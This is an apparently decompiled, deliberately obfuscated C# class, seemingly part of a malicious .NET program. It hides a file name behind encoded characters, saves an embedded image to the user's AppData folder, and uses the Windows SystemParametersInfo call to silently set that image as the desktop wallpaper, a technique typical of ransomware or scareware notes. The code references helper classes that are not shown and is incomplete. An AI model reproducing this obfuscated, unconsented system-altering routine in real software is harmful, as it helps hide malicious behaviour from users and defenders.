using System;
using System.Drawing;
using System.Runtime.InteropServices;

internal class TryJoin
{
	private unsafe static uint CustomMarshaler = 0x14u | (uint)sizeof(uint);

	private static uint UnsafeAddrOfPinnedArrayElement = 1u;

	private static uint DecodeLastFromUtf16 = (uint)AddAcrossWidening;

	private static string ThaiBuddhistCalendar;

	private static int AddAcrossWidening/* Not supported: data(02 00 00 00) */;

	private static int Opcode/* Not supported: data(12 00 00 00) */;

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	public static extern int SystemParametersInfo(uint uint_0, int int_0, string string_0, uint uint_1);

	public static void Frame()
	{
		char[] array = new char[1] { '\0' };
		string folderPath = System.Environment.GetFolderPath(System.Environment.SpecialFolder.ApplicationData);
		string string_ = string.Concat(char.ToString('ن'), "٭ٻ", char.ToString('ٶ') + "ٶ٪" + "ٻ٪ٿ٨ش٪ٴٽ");
		object[] array2 = new object[Convert.ToInt32("3", 8)];
		char c = array[0];
		array2[(int)c] = 253;
		char c2 = (char)Convert.ToInt32("1011", 2);
		array2[1] = c2;
		array2[_003CModule_003E.Deny[Convert.ToInt32("2", 8)]] = (char)(Opcode | 'Ԓ');
		_003CModule_003E.TryFormatDecimal(ref string_, array2);
		ThaiBuddhistCalendar = folderPath + string_;
		((Image)ThrowOnUnmappableCharUseAssem.Reverse).Save(ThaiBuddhistCalendar);
		SystemParametersInfo(CustomMarshaler, 0, ThaiBuddhistCalendar, UnsafeAddrOfPinnedArrayElement | DecodeLastFromUtf16);
	}
}
